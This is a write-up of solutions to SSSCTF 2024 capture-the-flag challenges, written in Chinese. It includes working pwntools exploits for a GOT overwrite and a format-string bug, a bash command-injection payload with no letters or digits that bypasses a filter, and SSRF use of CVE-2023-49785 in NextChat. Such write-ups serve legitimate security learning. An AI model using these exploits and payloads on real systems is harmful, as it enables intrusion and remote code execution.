---
title: SSSCTF 2024 Writeup
date: 2024-04-30T15:11:05+08:00
tags: [CTF]
---

## Pwn

### pwn1

> 越界写罢了

```bash
$ checksec pwn
[*] '/mnt/d/Works/ctf/sssctf/pwn1/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

程序没有开启 Full RELRO，可以考虑劫持 GOT 表。

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  size_t v3; // rax

  bufinit();
  gift();
  input(a1, a2);
  v3 = strlen(buf);
  printf("length : %d\n", v3);
  return 0LL;
}
```

```c
int gift()
{
  int v1; // [rsp+Ch] [rbp-264h] BYREF
  __int64 v2[44]; // [rsp+10h] [rbp-260h] BYREF
  char v3[252]; // [rsp+170h] [rbp-100h] BYREF
  int v4; // [rsp+26Ch] [rbp-4h]

  v4 = 0;
  puts("Welcome to this challenge!");
  v2[0] = (__int64)&puts;
  __isoc99_scanf("%252s", v3);
  puts("Good luck!");
  __isoc99_scanf("%d", &v1);
  if ( v1 > 15 && v1 <= 21 )
    v4 = v1;
  else
    puts("No!");
  puts("gift:");
  return puts((const char *)&v2[v4]);
}
```

首先分析 gift 函数，这里提供了 puts 的函数指针，可以用来获取 libc 基址，v4=0 即可。

```c
int input()
{
  size_t v0; // rax

  puts("index>>");
  __isoc99_scanf("%d", &aint);
  if ( aint < 0 || aint > 31 )
  {
    puts("No!");
    exit(1);
  }
  puts("input>>");
  read(0, buf, 0x20uLL);
  v0 = strlen(buf);
  printf("data length is %d\n", v0);
  puts("bye~");
  read(0, &buf[aint], 4uLL);
  return close(1);
}
```

```bash
.bss:00000000002020A0 buf             db 1Ch dup(?)           ; DATA XREF: input+64↑o
.bss:00000000002020A0                                         ; input+7A↑o ...
.bss:00000000002020BC aint            dd ?                    ; DATA XREF: input+10↑o
.bss:00000000002020BC                                         ; input+28↑r ...
```

input 函数可以向 buf 内写值，buf 为全局变量存储在 .bss 段。`read(0, buf, 0x20uLL);` 存在溢出漏洞可以修改 buf 后的变量，刚好就是 aint 的值，因此可以实现任意地址写。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
libc = ELF('./libc.so.6')

io = process('./pwn')

io.sendlineafter('challenge!', b'a'*252)
io.sendlineafter('luck!', b'-1')
io.recvuntil(b'gift:\n')
puts = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = puts - libc.sym['puts']
print('puts', hex(puts))

# gdb.attach(io, 'fini\n'*5)

io.sendlineafter(b'index>>', '0')
io.sendafter(b'input>>', b'/bin/sh\0'.ljust(28, b'a')+p32(2**32-136))
io.sendafter(b'bye~', p64(libc.sym['system'])[:4])
io.interactive()
# exec 1>&2
```

### pwn2

> 非栈上的格式化字符串罢了

```python
from pwn import *
context(arch='amd64', os='linux')
libc = ELF('./libc.so.6')
elf = ELF('./pwn')


def leak2(offset):
    payload = '%{}$p%{}$p'.format(offset//8+6, offset//8+7).encode()
    io.sendafter(b'length: ', str(len(payload)).encode().rjust(4, b'0'))
    io.sendafter(b'content: ', payload)
    return int(io.recv(14), 16), int(io.recv(14), 16)


def write(offset, word):
    payload = '%{}c%{}$hn'.format(word, offset//8+6).encode()
    io.sendafter(b'length: ', str(len(payload)).encode().rjust(4, b'0'))
    io.sendafter(b'content: ', payload)


io = process('./pwn')
# io = remote('210.30.97.133', 10016)

off0 = 0x20
off1 = 0xc0
addr1, addr2 = leak2(0x20)
stack = addr1-0x98-256+208-2088+8
libc.address = addr2-0x2a1ca
gadget = libc.address+0xef52b

print('stack:', hex(stack))
print('gadget:',hex(libc.address+0x583dc), hex(gadget))

write(off0, stack & 0xffff)
gdb.attach(io, 'fini')
write(off1, gadget & 0xffff)
write(off0, (stack+2) & 0xffff)
write(off1, (gadget >> 16) & 0xffff)

io.sendafter(b'length: ', b'0001')

io.interactive()
// TODO
```

## Reverse

### checkin

将程序导入 ida 分析，程序链接的符号表文件名即为 flag。

### 输入flag以获取flag

> 小白是一名骨灰级Windows用户。小白同学在制作ppt时候被xmind折磨了很久才找到破解方式，这时打ctf室友小黑给了他一个程序让他找到flag，小白看了一眼笑道：就这？我刚秒了两个！

附件为一个 Electron 应用程序。解压 .exe 文件后在 /resources 目录下可以发现已打包的 app.asar 文件。可以使用 asar 工具提取源文件。

```bash
$ npm i -g asar
$ cp app.asar app.asar.bak
$ asar extract app.asar src
```

之后可以在 src 目录下得到解压的 Node.js 源代码。

```js
'use strict';
const bytenode = require('bytenode');
const fs = require('fs');
const v8 = require('v8');
const path = require('path');

v8.setFlagsFromString('--no-lazy');

if (!fs.existsSync(path.join(__dirname, './main.jsc'))) {
    bytenode.compileFile(path.join(__dirname, './main.js'),path.join(__dirname,  './main.jsc'));
}

require(path.join(__dirname,'./main.jsc'));
```

程序核心文件 main.jsc 被使用 bytenode 加密了，不过可以使用 Node.js 的模块缓存技术来注入特定函数获取关键信息。

Node.js 在第一次使用 `require()` 等函数导入了模块后会将其结果存储到 `require.cache` 等对应模块缓存中，下一次再导入时会直接从中提取缓存结果。如果我们在目标代码执行前修改了模块缓存，就会导致目标代码调用被我们注入的外部库，进而可以对内部函数和变量进行操作。

通过分析 index.html 不难发现，程序的主要功能是将渲染线程传入的字符串 md5 后通过 Electron 的 ipc 接口发送到主线程对比。主线程内可能存在有关 md5 操作的代码，例如 Node.js 标准库中提供的 `crypto.Hash`。

```js
const { Hash } = require('crypto');
const _update = Hash.prototype.update;
Hash.prototype.update = function (...args) {
    output('Hash update', args);
    return _update.apply(this, args);
}
output('injected');
```

在 program.js 的 `require(path.join(__dirname,'./main.jsc'));` 之前插入上述代码，劫持 Hash 的 `update` 函数用于暴露加密内容（flag）。

```bash
$ asar pack src app.asar
```

打包源代码后重新运行“获取FLAG.exe”没有输出。但是在运行程序检查 flag 时会感觉到一定程度的延迟，怀疑其中发生了网络操作。断网后再次运行程序，控制台输出 `网络错误`。使用 Wireshark 抓包后发现每次检测 flag 时会向 http://ip-api.com/json 发送网络请求检查用户的 IP 信息，并且失败后会提示 `域外人员禁止访问`。

将 main.jsc 导入二进制分析器发现，字节码中存在一些关于 `country, countryCode, region, regionName, city` 的信息，猜测这可能是关于是否为“域内”的判断逻辑。

使用 express 框架模拟返回结果写一个简单的服务程序，并在 hosts 文件内将 ip-api.com 解析到 127.0.0.1。

```js
const express = require('express');
const app = express();

app.get('/json', (req, res) => {
  console.log(req.ip);
  res.json({
    "status": "success",
    "country": "China",
    "countryCode": "CN",
    "region": "TT",
    "regionName": "Tianting",
    "city": "NanTianMen",
    "zip": "",
    "lat": 38.8804,
    "lon": 121.529,
    "timezone": "Asia/Shanghai",
    "as": "AS4538 China Education and Research Network Center",
    "query": "210.30.97.133"
  })
})

app.listen(80)
```

此时再重新运行程序，即可成功打印出 flag 的内容。

## Web

### ravenfield

> need your help, comrade

一个 Web 小游戏，浏览源代码后发现没有什么其他网络资源，flag 应该就在源代码中。

代码审计（Ctrl+F搜索win）后发现一个关键字符串：`[SEC REF 672.C]\n\nThe facility is now in code yellow, thanks to your efforts. With all cameras back online, secondary cleanup crews will finish the job with minimal danger. We are pleased to report that no Raven escaped during the operation.\n\nYou are cleared to leave. Do svidaniya, comrade...\n\nYï»¿â€Žâ€Œâ€‹ï»¿â€â€â€‹â€ï»¿â€Œâ€‹ï»¿â€Žâ€â€‹ï»¿ï»¿â€â€‹ï»¿â€Žâ€â€‹â€ï»¿â€Œâ€‹â€Œâ€Žâ€â€‹ï»¿ï»¿â€â€‹â€ï»¿â€Žâ€‹ï»¿â€ï»¿â€‹ï»¿â€Žâ€â€‹â€Œâ€Žï»¿â€‹â€ï»¿â€Žâ€‹ï»¿â€â€â€‹â€Œâ€Žâ€â€‹â€ï»¿â€Žâ€‹ï»¿â€Žâ€â€‹â€Œâ€Œï»¿â€‹ï»¿â€ï»¿â€‹ï»¿â€Žâ€â€‹â€â€Žâ€Žâ€ŽOU WIN`。

将源文件 Ctrl+S 保存后用 VSCode 打开可以发现这段文本包含大量零宽字符，使用零宽字符解密即可。

- 喵语翻译：https://www.miao-lang.com/
- 零宽字符：https://yuanfux.github.io/zero-width-web/

### weirdbash_revenge

> 笨蛋小小喵修好了noobwaf，这次你还能拿到flag吗？

编码器在 `/encode` 路由下，执行器在 `/noob` 路由下，简单测试发现执行存在字符限制。

```js
bytemap = ['noob+', 'noob-', 'noob!', 'noob?', 'noob$', 'noob%', 'noob&', 'noob*']

function encode(code) {
  return code.split('').map(c => {
    return c.charCodeAt(0).toString(2).padStart(8, '0')
      .split('').map((b, i) => b == '1' ? bytemap[i] : '').join('')
  }
  ).join('')
}
```

写一个简单的脚本遍历出所有的字符黑名单，发现主要限制了字母和数字。可以使用 bash 的无字母数字脚本获取 flag：`__=${#};${!__}<<<${!__}\<\<\<\$\'\\$(($((${##}<<${##}))#${##}${#}${#}${#}${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}${#}${#}${#}${##}${##}${#}${##}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${##}${#}${#}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}))\\$(($((${##}<<${##}))#${##}${##}${##}${#}${#}${##}))\\$(($((${##}<<${##}))#${##}${#}${#}${##}${#}${#}${##}${#}))\\$(($((${##}<<${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}<<${##}))#${##}${#}${#}${#}${##}${##}${#}${##}))\\$(($((${##}<<${##}))#${##}${#}${#}${##}${#}${#}${##}${##}))\'`（运行时间在 3s 左右）。

### scr1wgpt

> 小小喵开发了一个福来哥生成器并交给了scr1wgpt保管，但是狡猾的小白对你进行了认知过滤。scr1wgpt悄悄告诉你它已经把flag藏在了它的scr1wgpt-web服务里，这次比赛就是你获得flag的关键！
> 
> 题目可能需要亿段时间（4min左右）启动，我知道你很急，但你先别急：）

打开后是一个登录界面，尝试常见的报错注入和联合注入没有发现什么端倪。注意到网站的 favicon 是 [NextChat](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web)，尝试 /chat 路由进入了主界面。简单查看版本号发现不是最新的版本，此版本存在 ssrf 漏洞：[CVE-2023-49785](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-49785)，可以通过 /api/cors 以服务端身份发送任意流量。

描述中提到“福来哥生成器”，尝试 /generator 路由发现一个可以生成 fake flag 的页面。根据“藏在了它的scr1wgpt-web服务里”，通过 /api/cors/scr1wgpt-web/generator 即可得到 flag。

## Crypto

### 原神(签到)

> 刘哥爱玩原神，flag全小写

搜索原神语对照后即为 flag。